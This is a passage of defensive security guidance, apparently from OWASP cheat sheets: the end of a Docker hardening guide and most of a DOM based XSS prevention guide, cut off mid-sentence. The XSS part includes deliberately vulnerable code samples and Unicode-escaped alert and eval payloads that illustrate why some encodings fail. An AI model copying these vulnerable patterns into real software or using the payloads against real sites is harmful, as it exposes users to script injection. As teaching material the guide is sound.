alpine\r\n    read_only: true\r\n```\r\n\r\nEquivalent in kubernetes in [Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) will be:\r\n\r\n```yaml\r\nkind: ...\r\napiVersion: ...\r\nmetadata:\r\n  name: ...\r\nspec:\r\n  ...\r\n  containers:\r\n  - name: ...\r\n    image: ....\r\n    securityContext:\r\n          ...\r\n          readOnlyRootFilesystem: true\r\n          ...\r\n```\r\n\r\nIn addition, if the volume is mounted only for reading **mount them as a read-only**\r\nIt can be done by appending `:ro` to the `-v` like this:\r\n\r\n```bash\r\ndocker run -v volume-name:/path/in/container:ro alpine\r\n```\r\n\r\nOr by using `--mount` option:\r\n\r\n```bash\r\ndocker run --mount source=volume-name,destination=/path/in/container,readonly alpine\r\n```\r\n\r\n### RULE \\#9 - Use static analysis tools\r\n\r\nTo detect containers with known vulnerabilities - scan images using static analysis tools.\r\n\r\n- Free\r\n    - [Clair](https://github.com/coreos/clair)\r\n    - [ThreatMapper](https://github.com/deepfence/ThreatMapper)\r\n    - [Trivy](https://github.com/knqyf263/trivy)\r\n- Commercial\r\n    - [Snyk](https://snyk.io/) **(open source and free option available)**\r\n    - [anchore](https://anchore.com/opensource/) **(open source and free option available)**\r\n    - [JFrog XRay](https://jfrog.com/xray/)\r\n    - [Qualys](https://www.qualys.com/apps/container-security/)\r\n\r\nTo detect secrets in images:\r\n\r\n- [ggshield](https://github.com/GitGuardian/ggshield) **(open source and free option available)**\r\n- [SecretScanner](https://github.com/deepfence/SecretScanner) **(open source)**\r\n\r\nTo detect misconfigurations in Kubernetes:\r\n\r\n- [kubeaudit](https://github.com/Shopify/kubeaudit)\r\n- [kubesec.io](https://kubesec.io/)\r\n- [kube-bench](https://github.com/aquasecurity/kube-bench)\r\n\r\nTo detect misconfigurations in Docker:\r\n\r\n- [inspec.io](https://www.inspec.io/docs/reference/resources/docker/)\r\n- [dev-sec.io](https://dev-sec.io/baselines/docker/)\r\n- [Docker Bench for Security](https://github.com/docker/docker-bench-security)\r\n\r\n### RULE \\#10 - Set the logging level to at least INFO\r\n\r\nBy default, the Docker daemon is configured to have a base logging level of 'info', and if this is not the case: set the Docker daemon log level to 'info'. Rationale: Setting up an appropriate log level, configures the Docker daemon to log events that you would want to review later. A base log level of 'info' and above would capture all logs except the debug logs. Until and unless required, you should not run docker daemon at the 'debug' log level.\r\n\r\nTo configure the log level in docker-compose:\r\n\r\n```bash\r\ndocker-compose --log-level info up\r\n```\r\n\r\n### Rule \\#11 - Lint the Dockerfile at build time\r\n\r\nMany issues can be prevented by following some best practices when writing the Dockerfile. Adding a security linter as a step in the build pipeline can go a long way in avoiding further headaches. Some issues that are worth checking are:\r\n\r\n- Ensure a `USER` directive is specified\r\n- Ensure the base image version is pinned\r\n- Ensure the OS packages versions are pinned\r\n- Avoid the use of `ADD` in favor of `COPY`\r\n- Avoid curl bashing in `RUN` directives\r\n\r\nReferences:\r\n\r\n- [Docker Baselines on DevSec](https://dev-sec.io/baselines/docker/)\r\n- [Use the Docker command line](https://docs.docker.com/engine/reference/commandline/cli/)\r\n- [Overview of docker-compose CLI](https://docs.docker.com/compose/reference/overview/)\r\n- [Configuring Logging Drivers](https://docs.docker.com/config/containers/logging/configure/)\r\n- [View logs for a container or service](https://docs.docker.com/config/containers/logging/)\r\n- [Dockerfile Security Best Practices](https://cloudberry.engineering/article/dockerfile-security-best-practices/)\r\n\r\n### Rule \\#12 - Run Docker in root-less mode\r\n\r\nRootless mode ensures that the Docker daemon and containers are running as an unprivileged user, which means that even if an attacker breaks out of the container, they will not have root privileges on the host, which in turn substantially limits the attack surface.\r\n\r\nRootless mode graduated from experimental in Docker Engine v20.10 and should be considered for added security, provided the [known limitations](https://docs.docker.com/engine/security/rootless/#known-limitations) are not an impediment.\r\n\r\n> Rootless mode allows running the Docker daemon and containers as a non-root user to mitigate potential vulnerabilities in the daemon and the container runtime.\r\n> Rootless mode does not require root privileges even during the installation of the Docker daemon, as long as the [prerequisites](https://docs.docker.com/engine/security/rootless/#prerequisites) are met.\r\n> Rootless mode was introduced in Docker Engine v19.03 as an experimental feature. Rootless mode graduated from experimental in Docker Engine v20.10.\r\n\r\nRead more about rootless mode and its limitations, installation and usage instructions on [Docker documentation](https://docs.docker.com/engine/security/rootless/) page.\r\n\r\n## Related Projects\r\n\r\n[OWASP Docker Top 10](https://github.com/OWASP/Docker-Security)\r\n"
    },
    {
      "DOM_based_XSS_Prevention_Cheat_Sheet.md": "# DOM based XSS Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nWhen looking at XSS (Cross-Site Scripting), there are three generally recognized forms of [XSS](https://owasp.org/www-community/attacks/xss/):\r\n\r\n- [Reflected or Stored](https://owasp.org/www-community/attacks/xss/#stored-and-reflected-xss-attacks)\r\n- [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\r\n\r\nThe [XSS Prevention Cheatsheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md) does an excellent job of addressing Reflected and Stored XSS. This cheatsheet addresses DOM (Document Object Model) based XSS and is an extension (and assumes comprehension) of the [XSS Prevention Cheatsheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\nIn order to understand DOM based XSS, one needs to see the fundamental difference between Reflected and Stored XSS when compared to DOM based XSS. The primary difference is where the attack is injected into the application.\r\n\r\nReflected and Stored XSS are server side injection issues while DOM based XSS is a client (browser) side injection issue.\r\n\r\nAll of this code originates on the server, which means it is the application owner's responsibility to make it safe from XSS, regardless of the type of XSS flaw it is. Also, XSS attacks always **execute** in the browser.\r\n\r\nThe difference between Reflected/Stored XSS is where the attack is added or injected into the application. With Reflected/Stored the attack is injected into the application during server-side processing of requests where untrusted input is dynamically added to HTML. For DOM XSS, the attack is injected into the application during runtime in the client directly.\r\n\r\nWhen a browser is rendering HTML and any other associated content like CSS or JavaScript, it identifies various rendering contexts for the different kinds of input and follows different rules for each context. A rendering context is associated with the parsing of HTML tags and their attributes.\r\n\r\n- The HTML parser of the rendering context dictates how data is presented and laid out on the page and can be further broken down into the standard contexts of HTML, HTML attribute, URL, and CSS.\r\n- The JavaScript or VBScript parser of an execution context is associated with the parsing and execution of script code. Each parser has distinct and separate semantics in the way they can possibly execute script code which make creating consistent rules for mitigating vulnerabilities in various contexts difficult. The complication is compounded by the differing meanings and treatment of encoded values within each subcontext (HTML, HTML attribute, URL, and CSS) within the execution context.\r\n\r\nFor the purposes of this article, we refer to the HTML, HTML attribute, URL, and CSS contexts as subcontexts because each of these contexts can be reached and set within a JavaScript execution context.\r\n\r\nIn JavaScript code, the main context is JavaScript but with the right tags and context closing characters, an attacker can try to attack the other 4 contexts using equivalent JavaScript DOM methods.\r\n\r\nThe following is an example vulnerability which occurs in the JavaScript context and HTML subcontext:\r\n\r\n```html\r\n <script>\r\n var x = '<%= taintedVar %>';\r\n var d = document.createElement('div');\r\n d.innerHTML = x;\r\n document.body.appendChild(d);\r\n </script>\r\n```\r\n\r\nLet's look at the individual subcontexts of the execution context in turn.\r\n\r\n## RULE \\#1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context\r\n\r\nThere are several methods and attributes which can be used to directly render HTML content within JavaScript. These methods constitute the HTML Subcontext within the Execution Context. If these methods are provided with untrusted input, then an XSS vulnerability could result. For example:\r\n\r\n### Example Dangerous HTML Methods\r\n\r\n#### Attributes\r\n\r\n```javascript\r\n element.innerHTML = \"<HTML> Tags and markup\";\r\n element.outerHTML = \"<HTML> Tags and markup\";\r\n```\r\n\r\n#### Methods\r\n\r\n```javascript\r\n document.write(\"<HTML> Tags and markup\");\r\n document.writeln(\"<HTML> Tags and markup\");\r\n```\r\n\r\n### Guideline\r\n\r\nTo make dynamic updates to HTML in the DOM safe, we recommend:\r\n\r\n 1. HTML encoding, and then\r\n 2. JavaScript encoding all untrusted input, as shown in these examples:\r\n\r\n```javascript\r\n var ESAPI = require('node-esapi');\r\n element.innerHTML = \"<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>\";\r\n element.outerHTML = \"<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>\";\r\n```\r\n\r\n```javascript\r\n var ESAPI = require('node-esapi');\r\n document.write(\"<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>\");\r\n document.writeln(\"<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%>\");\r\n```\r\n\r\n## RULE \\#2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context\r\n\r\nThe HTML attribute *subcontext* within the *execution* context is divergent from the standard encoding rules. This is because the rule to HTML attribute encode in an HTML attribute rendering context is necessary in order to mitigate attacks which try to exit out of an HTML attributes or try to add additional attributes which could lead to XSS.\r\n\r\nWhen you are in a DOM execution context you only need to JavaScript encode HTML attributes which do not execute code (attributes other than event handler, CSS, and URL attributes).\r\n\r\nFor example, the general rule is to HTML Attribute encode untrusted data (data from the database, HTTP request, user, back-end system, etc.) placed in an HTML Attribute. This is the appropriate step to take when outputting data in a rendering context, however using HTML Attribute encoding in an execution context will break the application display of data.\r\n\r\n### SAFE but BROKEN example\r\n\r\n```javascript\r\n var ESAPI = require('node-esapi');\r\n var x = document.createElement(\"input\");\r\n x.setAttribute(\"name\", \"company_name\");\r\n // In the following line of code, companyName represents untrusted user input\r\n // The ESAPI.encoder().encodeForHTMLAttribute() is unnecessary and causes double-encoding\r\n x.setAttribute(\"value\", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTMLAttribute(companyName))%>');\r\n var form1 = document.forms[0];\r\n form1.appendChild(x);\r\n```\r\n\r\nThe problem is that if companyName had the value \"Johnson & Johnson\". What would be displayed in the input text field would be \"Johnson &#x26;amp; Johnson\". The appropriate encoding to use in the above case would be only JavaScript encoding to disallow an attacker from closing out the single quotes and in-lining code, or escaping to HTML and opening a new script tag.\r\n\r\n### SAFE and FUNCTIONALLY CORRECT example\r\n\r\n```javascript\r\n var ESAPI = require('node-esapi');\r\n var x = document.createElement(\"input\");\r\n x.setAttribute(\"name\", \"company_name\");\r\n x.setAttribute(\"value\", '<%=ESAPI.encoder().encodeForJavascript(companyName)%>');\r\n var form1 = document.forms[0];\r\n form1.appendChild(x);\r\n```\r\n\r\nIt is important to note that when setting an HTML attribute which does not execute code, the value is set directly within the object attribute of the HTML element so there is no concerns with injecting up.\r\n\r\n## RULE \\#3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context\r\n\r\nPutting dynamic data within JavaScript code is especially dangerous because JavaScript encoding has different semantics for JavaScript encoded data when compared to other encodings. In many cases, JavaScript encoding does not stop attacks within an execution context. For example, a JavaScript encoded string will execute even though it is JavaScript encoded.\r\n\r\nTherefore, the primary recommendation is to **avoid including untrusted data in this context**. If you must, the following examples describe some approaches that do and do not work.\r\n\r\n```javascript\r\nvar x = document.createElement(\"a\");\r\nx.href=\"#\";\r\n// In the line of code below, the encoded data on the right (the second argument to setAttribute)\r\n// is an example of untrusted data that was properly JavaScript encoded but still executes.\r\nx.setAttribute(\"onclick\", \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0032\\u0032\\u0029\");\r\nvar y = document.createTextNode(\"Click To Test\");\r\nx.appendChild(y);\r\ndocument.body.appendChild(x);\r\n```\r\n\r\nThe `setAttribute(name_string,value_string)` method is dangerous because it implicitly coerces the *value_string* into the DOM attribute datatype of *name_string*.\r\n\r\nIn the case above, the attribute name is an JavaScript event handler, so the attribute value is implicitly converted to JavaScript code and evaluated. In the case above, JavaScript encoding does not mitigate against DOM based XSS.\r\n\r\nOther JavaScript methods which take code as a string types will have a similar problem as outline above (`setTimeout`, `setInterval`, new Function, etc.). This is in stark contrast to JavaScript encoding in the event handler attribute of a HTML tag (HTML parser) where JavaScript encoding mitigates against XSS.\r\n\r\n```html\r\n<!-- Does NOT work  -->\r\n<a id=\"bb\" href=\"#\" onclick=\"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\"> Test Me</a>\r\n```\r\n\r\nAn alternative to using `Element.setAttribute(...)` to set DOM attributes is to set the attribute directly. Directly setting event handler attributes will allow JavaScript encoding to mitigate against DOM based XSS. Please note, it is always dangerous design to put untrusted data directly into a command execution context.\r\n\r\n``` html\r\n<a id=\"bb\" href=\"#\"> Test Me</a>\r\n```\r\n\r\n``` javascript\r\n//The following does NOT work because the event handler is being set to a string.\r\n//\"alert(7)\" is JavaScript encoded.\r\ndocument.getElementById(\"bb\").onclick = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0029\";\r\n\r\n//The following does NOT work because the event handler is being set to a string.\r\ndocument.getElementById(\"bb\").onmouseover = \"testIt\";\r\n\r\n//The following does NOT work because of the encoded \"(\" and \")\".\r\n//\"alert(77)\" is JavaScript encoded.\r\ndocument.getElementById(\"bb\").onmouseover = \\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0037\\u0037\\u0029;\r\n\r\n//The following does NOT work because of the encoded \";\".\r\n//\"testIt;testIt\" is JavaScript encoded.\r\ndocument.getElementById(\"bb\").onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074\\u003b\\u0074\\u0065\\u0073\r\n                                            \\u0074\\u0049\\u0074;\r\n\r\n//The following DOES WORK because the encoded value is a valid variable name or function reference.\r\n//\"testIt\" is JavaScript encoded\r\ndocument.getElementById(\"bb\").onmouseover = \\u0074\\u0065\\u0073\\u0074\\u0049\\u0074;\r\n\r\nfunction testIt() {\r\n   alert(\"I was called.\");\r\n}\r\n```\r\n\r\nThere are other places in JavaScript where JavaScript encoding is accepted as valid executable code.\r\n\r\n```javascript\r\n for(var \\u0062=0; \\u0062 < 10; \\u0062++){\r\n     \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\r\n     .\\u0077\\u0072\\u0069\\u0074\\u0065\\u006c\\u006e\r\n     (\"\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064\");\r\n }\r\n \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\r\n .\\u0065\\u0076\\u0061\\u006c\r\n \\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\r\n .\\u0077\\u0072\\u0069\\u0074\\u0065(111111111);\r\n```\r\n\r\nor\r\n\r\n```javascript\r\n var s = \"\\u0065\\u0076\\u0061\\u006c\";\r\n var t = \"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\";\r\n window[s](t);\r\n```\r\n\r\nBecause JavaScript is based on an international standard (ECMAScript), JavaScript encoding enables the support of international characters in programming constructs and variables in addition to alternate string representations (string escapes).\r\n\r\nHowever the opposite is the case with HTML encoding. HTML tag elements are well defined and do not support alternate representations of the same tag. So HTML encoding cannot be used to allow the developer to have alternate representations of the `<a>` tag for example.\r\n\r\n### HTML Encoding's Disarming Nature\r\n\r\nIn general, HTML encoding serves to castrate HTML tags which are placed in HTML and HTML attribute contexts. Working example (no HTML encoding):\r\n\r\n```html\r\n<a href=\"...\" >\r\n```\r\n\r\nNormally encoded example (Does Not Work – DNW):\r\n\r\n```html\r\n&#x3c;a href=... &#x3e;\r\n```\r\n\r\nHTML encoded example to highlight a fundamental difference with JavaScript encoded values (DNW):\r\n\r\n```html\r\n<&#x61; href=...>\r\n```\r\n\r\nIf HTML encoding followed the same semantics as JavaScript encoding. The line above could have possibly worked to render a link. This difference makes JavaScript encoding a less viable weapon in our fight against XSS.\r\n\r\n## RULE \\#4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context\r\n\r\nNormally executing JavaScript from a CSS context required either passing `javascript:attackCode()` to the CSS `url()` method or invoking the CSS `expression()` method passing JavaScript code to be directly executed.\r\n\r\nFrom my experience, calling the `expression()` function from an execution context (JavaScript) has been disabled. In order to mitigate against the CSS `url()` method, ensure that you are URL encoding the data passed to the CSS `url()` method.\r\n\r\n```javascript\r\nvar ESAPI = require('node-esapi');\r\ndocument.body.style.backgroundImage = \"url(<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(companyName))%>)\";\r\n```\r\n\r\n## RULE \\#5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context\r\n\r\nThe logic which parses URLs in both execution and rendering contexts looks to be the same. Therefore there is little change in the encoding rules for URL attributes in an execution (DOM) context.\r\n\r\n```javascript\r\nvar ESAPI = require('node-esapi');\r\nvar x = document.createElement(\"a\");\r\nx.setAttribute(\"href\", '<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(userRelativePath))%>');\r\nvar y = document.createTextElement(\"Click Me To Test\");\r\nx.appendChild(y);\r\ndocument.body.appendChild(x);\r\n```\r\n\r\nIf you utilize fully qualified URLs then this will break the links as the colon in the protocol identifier (`http:` or `javascript:`) will be URL encoded preventing the `http` and `javascript` protocols from being invoked.\r\n\r\n## RULE \\#6 - Populate the DOM using safe JavaScript functions or properties\r\n\r\nThe most fundamental safe way to populate the DOM with untrusted data is to use the safe assignment property `textContent`.\r\n\r\nHere is an example of safe usage.\r\n\r\n```html\r\n<script>\r\nelement.textContent = untrustedData;  //does not execute code\r\n</script>\r\n```\r\n\r\n## RULE \\#7 - Fixing DOM Cross-site Scripting Vulnerabilities\r\n\r\nThe best way to fix DOM based cross-site scripting is to use the right output method (sink). For example if you want to use user input to write in a `div tag` element don't use `innerHtml`, instead use `innerText` or `textContent`. This will solve the problem, and it is the right way to re-mediate DOM based XSS vulnerabilities.\r\n\r\n**It is always a bad idea to use a user-controlled input in dangerous sources such as eval. 99% of the time it is an indication of bad or lazy programming practice, so simply don't do it instead of trying to sanitize the input.**\r\n\r\nFinally, to fix the problem in our initial code, instead of trying to encode the output correctly which is a hassle and can easily go wrong we would simply use `element.textContent` to write it in a content like this:\r\n\r\n```html\r\n<b>Current URL:</b> <span id=\"contentholder\"></span>\r\n...\r\n<script>\r\ndocument.getElementById(\"contentholder\").textContent = document.baseURI;\r\n</script>\r\n```\r\n\r\nIt does the same thing but this time it is not vulnerable to DOM based cross-site scripting vulnerabilities.\r\n\r\n## Guidelines for Developing Secure Applications Utilizing JavaScript\r\n\r\nDOM based XSS is extremely difficult to mitigate against because of its large attack surface and lack of standardization across browsers.\r\n\r\nThe guidelines below are an attempt to provide guidelines for developers when developing Web based JavaScript applications (Web 2.0) such that they can avoid XSS.\r\n\r\n### GUIDELINE \\#1 - Untrusted data should only be treated as displayable text\r\n\r\nAvoid treating untrusted data as code or markup within JavaScript code.\r\n\r\n### GUIDELINE \\#2 - Always JavaScript encode and delimit untrusted data as quoted strings when entering the application when building templated JavaScript\r\n\r\nAlways JavaScript encode and delimit untrusted data as quoted strings when entering the application as illustrated in the following example.\r\n\r\n```javascript\r\nvar x = \"<%= Encode.forJavaScript(untrustedData) %>\";\r\n```\r\n\r\n### GUIDELINE \\#3 - Use document.createElement(\"...\"), element.setAttribute(\"...\",\"value\"), element.appendChild(...) and similar to build dynamic interfaces\r\n\r\n`document.createElement(\"...\")`, `element.setAttribute(\"...\",\"value\")`, `element.appendChild(...)` and similar are safe ways to build dynamic interfaces.\r\n\r\nPlease note, `element.setAttribute` is only safe for a limited number of attributes.\r\n\r\nDangerous attributes include any attribute that is a command execution context, such as `onclick` or `onblur`.\r\n\r\nExamples of safe attributes includes: `align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`.\r\n\r\n### GUIDELINE \\#4 - Avoid sending untrusted data into HTML rendering methods\r\n\r\nAvoid populating the following methods with untrusted data.\r\n\r\n1. `element.innerHTML = \"...\";`\r\n2. `element.outerHTML = \"...\";`\r\n3. `document.write(...);`\r\n4. `document.writeln(...);`\r\n\r\n### GUIDELINE \\#5 - Avoid the numerous methods which implicitly eval() data passed to it\r\n\r\nThere are numerous methods which implicitly `eval()` data passed to it that must be avoided.\r\n\r\nMake sure that any untrusted data passed to these methods is:\r\n\r\n1. Delimited with string delimiters\r\n2. Enclosed within a closure or JavaScript encoded to N-levels based on usage\r\n3. Wrapped in a custom function.\r\n\r\nEnsure to follow step 3 above to make sure that the untrusted data is not sent to dangerous methods within the custom function or handle it by adding an extra layer of encoding.\r\n\r\n#### Utilizing an Enclosure (as suggested by Gaz)\r\n\r\nThe example that follows illustrates using closures to avoid double JavaScript encoding.\r\n\r\n```javascript\r\n var ESAPI = require('node-esapi');\r\n setTimeout((function(param) { return function() {\r\n          customFunction(param);\r\n        }\r\n })(\"<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>\"), y);\r\n```\r\n\r\nThe other alternative is using N-levels of encoding.\r\n\r\n#### N-Levels of Encoding\r\n\r\nIf your code looked like the following, you would need to only double JavaScript encode input data.\r\n\r\n```javascript\r\nsetTimeout(\"customFunction('<%=doubleJavaScriptEncodedData%>', y)\");\r\nfunction customFunction (firstName, lastName)\r\n     alert(\"Hello\" + firstName + \" \" + lastNam);\r\n}\r\n```\r\n\r\nThe `doubleJavaScriptEncodedData` has its first layer of JavaScript encoding reversed (upon execution) in the single quotes.\r\n\r\nThen the implicit `eval` of `setTimeout` reverses another layer of JavaScript encoding to pass the correct value to `customFunction`\r\n\r\nThe reason why you only need to double JavaScript encode is that the `customFunction` function did not itself pass the input to another method which implicitly or explicitly called `eval` If *firstName* was passed to another JavaScript method which implicitly or explicitly called `eval()` then `<%=doubleJavaScriptEncodedData%>` above would need to be changed to `<%=tripleJavaScriptEncodedData%>`.\r\n\r\nAn important implementation note is that if the JavaScript code tries to utilize the double or triple encoded data in string comparisons, the value may be interpreted as different values based on the number of `evals()` the data has passed through before being passed to the if comparison and the number of times the value was JavaScript encoded.\r\n\r\nIf **A** is double JavaScript encoded then the following **if** check will return false.\r\n\r\n``` javascript\r\n var x = \"doubleJavaScriptEncodedA\";  //\\u005c\\u0075\\u0030\\u0030\\u0034\\u0031\r\n if (x == \"A\") {\r\n    alert(\"x is A\");\r\n } else if (x == \"\\u0041\") {\r\n    alert(\"This is what pops\");\r\n }\r\n```\r\n\r\nThis brings up an interesting design point. Ideally, the correct way to apply encoding and avoid the problem stated above is to server-side encode for the output context where data is introduced into the application.\r\n\r\nThen client-side encode (using a JavaScript encoding library such as [node-esapi](https://github.com/ESAPI/node-esapi/)) for the individual subcontext (DOM methods) which untrusted data is passed to.\r\n\r\nHere are some examples of how they are used:\r\n\r\n```javascript\r\n//server-side encoding\r\nvar ESAPI = require('node-esapi');\r\nvar input = \"<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>\";\r\n```\r\n\r\n```javascript\r\n//HTML encoding is happening in JavaScript\r\nvar ESAPI = require('node-esapi');\r\ndocument.writeln(ESAPI.encoder().encodeForHTML(input));\r\n```\r\n\r\nOne option is utilize ECMAScript 5 immutable properties in the JavaScript library.\r\nAnother option provided by Gaz (Gareth) was to use a specific code construct to limit mutability with anonymous closures.\r\n\r\nAn example follows:\r\n\r\n```javascript\r\nfunction escapeHTML(str) {\r\n     str = str + \"''\";\r\n     var out = \"''\";\r\n     for(var i=0; i<str.length; i++) {\r\n         if(str[i] === '<') {\r\n             out += '&lt;';\r\n         } else if(str[i] === '>') {\r\n             out += '&gt;';\r\n         } else if(str[i] === \"'\") {\r\n             out += '&#39;';\r\n         } else if(str[i] === '\"') {\r\n             out += '&quot;';\r\n         } else {\r\n             out += str[i];\r\n         }\r\n     }\r\n     return out;\r\n}\r\n```\r\n\r\n### GUIDELINE \\#6 - Use untrusted data on only the right side of an expression\r\n\r\nUse untrusted data on only the right side of an expression, especially data that looks like code and may be passed to the application (e.g., `location` and `eval()`).\r\n\r\n```javascript\r\nwindow[userDataOnLeftSide] = \"userDataOnRightSide\";\r\n```\r\n\r\nUsing untrusted user data on the left side of the expression allows an attacker to subvert internal and external attributes of the window object, whereas using user input on the right side of the expression doesn't allow direct manipulation.\r\n\r\n### GUIDELINE \\#7 - When URL encoding in DOM be aware of character set issues\r\n\r\nWhen URL encoding in DOM be aware of character set issues as the character set in JavaScript DOM is not clearly defined (Mike Samuel).\r\n\r\n### GUIDELINE \\#8 - Limit access to object properties when using object\\[x\\] accessors\r\n\r\nLimit access to object properties when using `object[x]` accessors (Mike Samuel). In other words, add a level of indirection between untrusted input and specified object properties.\r\n\r\nHere is an example of the problem using map types:\r\n\r\n```javascript\r\nvar myMapType = {};\r\nmyMapType[<%=untrustedData%>] = \"moreUntrustedData\";\r\n```\r\n\r\nThe developer writing the code above was trying to add additional keyed elements to the `myMapType` object. However, this could be used by an attacker to subvert internal and external attributes of the `myMapType` object.\r\n\r\nA better approach would be to use the following:\r\n\r\n```javascript\r\nif (untrustedData === 'location') {\r\n  myMapType.location = \"moreUntrustedData\";\r\n}\r\n```\r\n\r\n### GUIDELINE \\#9 - Run your JavaScript in a ECMAScript 5 canopy or sandbox\r\n\r\nRun your JavaScript in a ECMAScript 5 [canopy](https://github.com/jcoglan/canopy) or sandbox to make it harder for your JavaScript API to be compromised (Gareth Heyes and John Stevens).\r\n\r\nExamples of some JavaScript sandbox / sanitizers:\r\n\r\n- [js-xss](https://github.com/leizongmin/js-xss)\r\n- [sanitize-html](https://github.com/apostrophecms/sanitize-html)\r\n- [DOMPurify](https://github.com/cure53/DOMPurify)\r\n- [MDN - HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)\r\n- [OWASP Summit 2011 - DOM Sandboxing](https://owasp.org/www-pdf-archive/OWASPSummit2011DOMSandboxingBrowserSecurityTrack.pdf)\r\n\r\n### GUIDELINE \\#10 - Don't eval() JSON to convert it to native JavaScript objects\r\n\r\nDon't `eval()` JSON to convert it to native JavaScript objects. Instead use `JSON.toJSON()` and `JSON.parse()` (Chris Schmidt).\r\n\r\n## Common Problems Associated with Mitigating DOM Based XSS\r\n\r\n### Complex Contexts\r\n\r\nIn many cases the context isn't always straightforward to discern.\r\n\r\n```html\r\n<a href=\"javascript:myFunction('<%=untrustedData%>', 'test');\">Click Me</a>\r\n ...\r\n<script>\r\nFunction myFunction (url,name) {\r\n    window.location = url;\r\n}\r\n</script>\r\n```\r\n\r\nIn the above example, untrusted data started in the rendering URL context (`href` attribute of an `a` tag) then changed to a JavaScript execution context (`javascript:` protocol handler) which passed the untrusted data to an execution URL subcontext (`window.location` of `myFunction`).\r\n\r\nBecause the data was introduced in JavaScript code and passed to a URL subcontext the appropriate server-side encoding would be the following:\r\n\r\n```html\r\n<a href=\"javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForURL(untrustedData)) %>', 'test');\">\r\nClick Me</a>\r\n ...\r\n```\r\n\r\nOr if you were using ECMAScript 5 with an immutable JavaScript client-side encoding libraries you could do the following:\r\n\r\n```html\r\n<!-- server side URL encoding has been removed.  Now only JavaScript encoding on server side. -->\r\n<a href=\"javascript:myFunction('<%=ESAPI.encoder().encodeForJavascript(untrustedData)%>', 'test');\">Click Me</a>\r\n ...\r\n<script>\r\nFunction myFunction (url,name) {\r\n    var encodedURL = ESAPI.encoder().encodeForURL(url);  //URL encoding using client-side scripts\r\n    window.location = encodedURL;\r\n}\r\n</script>\r\n```\r\n\r\n### Inconsistencies of Encoding Libraries\r\n\r\nThere are a number of open source encoding libraries out there:\r\n\r\n1. OWASP [ESAPI](https://owasp.org/www-project-enterprise-security-api/)\r\n2. OWASP [Java Encoder](https://owasp.org/www-project-java-encoder/)\r\n3. Apache Commons Text [StringEscapeUtils](https://commons.apache.org/proper/commons-text/javadocs/api-release/org/apache/commons/text/StringEscapeUtils.html), replace one from [Apache Commons Lang3](https://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/StringEscapeUtils.html)\r\n4. [Jtidy](http://jtidy.sourceforge.net/)\r\n5. Your company's custom implementation.\r\n\r\nSome work on a block list while others ignore important characters like \"&lt;\" and \"&gt;\".\r\n\r\nJava Encoder is an active project providing supports for HTML, CSS and JavaScript encoding.\r\n\r\nESAPI is one of the few which works on an allow list and encodes all non-alphanumeric characters. It is important to use an encoding library that understands which characters can be used to exploit vulnerabilities in their respective contexts. Misconceptions abound related to the proper encoding that is required.\r\n\r\n### Encoding Misconceptions\r\n\r\nMany security training curriculums and papers advocate the blind usage of HTML encoding to resolve XSS.\r\n\r\nThis logically seems to be prudent advice as the JavaScript parser does not understand HTML encoding.\r\n\r\nHowever, if the pages returned from your web application utilize a content type of `text/xhtml` or the file type extension of `*.xhtml` then HTML encoding may not work to mitigate against XSS.\r\n\r\nFor example:\r\n\r\n```html\r\n<script>\r\n&#x61;lert(1);\r\n</script>\r\n```\r\n\r\nThe HTML encoded value above is still executable. If that isn't enough to keep in mind, you have to remember that encodings are lost when you retrieve them using the value attribute of a DOM element.\r\n\r\nLet's look at the sample page and script:\r\n\r\n```html\r\n<form name=\"myForm\" ...>\r\n  <input type=\"text\" name=\"lName\" value=\"<%=ESAPI.encoder().encodeForHTML(last_name)%>\">\r\n ...\r\n</form>\r\n<script>\r\n  var x = document.myForm.lName.value;  //when the value is retrieved the encoding is reversed\r\n  document.writeln(x);  //any code passed into lName is now executable.\r\n</script>\r\n```\r\n\r\nFinally there is the problem that certain methods in JavaScript which are usually safe can be unsafe 